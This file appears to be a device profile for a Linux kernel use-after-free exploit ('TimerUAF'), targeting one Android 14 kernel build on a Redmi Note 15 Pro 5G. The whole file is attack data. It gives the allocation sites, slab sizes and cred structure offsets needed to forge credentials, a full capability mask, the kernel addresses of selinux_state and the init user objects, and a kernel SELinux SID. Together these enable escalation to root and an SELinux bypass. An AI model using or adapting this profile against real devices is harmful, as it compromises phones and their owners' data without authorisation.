# TimerUAF kernel profile (HOCON; JSON remains valid)
# Device: Redmi Note 15 Pro 5G (lapis)
# Kernel: 6.1.138-android14-11-g51f8c580613d-ab13911623 (4K pages)
#
# Every constant below is derived from that factory boot.img.  6.1 links with
# the __pi_ kernel VA base, so text and data live at 0xffffffc008...
#   init_posix_timers   kmem_cache_create("posix_timers_cache", 0x108, 0,
#                       SLAB_PANIC|SLAB_ACCOUNT) -> timer_alloc 0x108
#   do_timer_create     bl kmem_cache_alloc at 0xffffffc008191af4, returns to
#                       0xffffffc008191af8 (x0 = posix_timers_cache)
#   copy_process        calls dup_task_struct, whose
#                       bl kmem_cache_alloc_node at 0xffffffc0080ab67c
#                       returns to 0xffffffc0080ab680 (x0 = task_struct_cachep)
#                       -> low21 0xab680
#   fork_init() passes 0x12c0 to kmem_cache_create_usercopy("task_struct"),
#   and there is no task_struct_vendor_size_setup() on 6.1, so
#   task_alloc_bytes stays 0x12c0.
#
# Vulnerability: fs/exec.c begin_new_exec() still calls
# posix_cpu_timers_exit() before exit_itimers().
release = "6.1.138-android14-11-g51f8c580613d-ab13911623"
schema_version = 1
ksu_kmi = "android14-6.1"

page_size = 4096
page_shift = 12
slab_order = 1
slab_size = 8192
linear_min = 0xffffff0000000000
linear_max = 0xffffffc000000000

# 6.1 frees order-1 slab pages through the PCP lists, which emit no
# mm_page_free event, so the reclaim is gated on /proc/slabinfo instead.
pcp_free = 1

# do_timer_create -> kmem_cache_alloc(posix_timers_cache)
timer_site = 0xffffffc008191af8
timer_alloc = 0x108
# The `it` union (k_itimer.it) is at +0x78; its `cpu` member is a
# struct cpu_timer, whose first field `node` is at +0, so the timerqueue
# rb_node sits at +0x78.
timer_node_off = 0x78

# cred_jar: kmem_cache_create("cred_jar", 0xb0, 0,
#   SLAB_PANIC|SLAB_ACCOUNT|SLAB_HWCACHE_ALIGN) -> object 0xc0
cred_req = 0xb0
cred_alloc = 0xc0
cred_size = 0xb0
# 6.1 cred uses a 4-byte atomic_t usage, so every field shifts down by 8.
cred_uid_off = 0x4
cred_euid_off = 0x14
cred_cap_off = 0x28
cred_cap_count = 5
cred_security_off = 0x78
cred_user_off = 0x80
cred_userns_off = 0x88
cred_ucounts_off = 0x90
cred_group_off = 0x98
fake_cred_off = 0x18

# link-time symbols (kallsyms)
selinux_state = 0xffffffc00a2293d0
panic_on_warn = 0xffffffc009fdae08

# task_struct / cred layout (BTF)
task_cred_off = 0x838
copy_process_low21 = 0xab680
task_alloc_bytes = 0x12c0

# capability and fake-cred refcounted sub-objects
fullcap = 0x1ffffffffff
root_user = 0xffffffc00a000740
init_user_ns = 0xffffffc00a0004b0
init_ucounts = 0xffffffc00a001fc8
init_groups = 0xffffffc00a001a60

# task_security_struct
# Only selinux registers a cred blob here, and it is the first contributor,
# so its offset is 0.
selinux_blob_off = 0x0
selinux_sid_kernel = 1
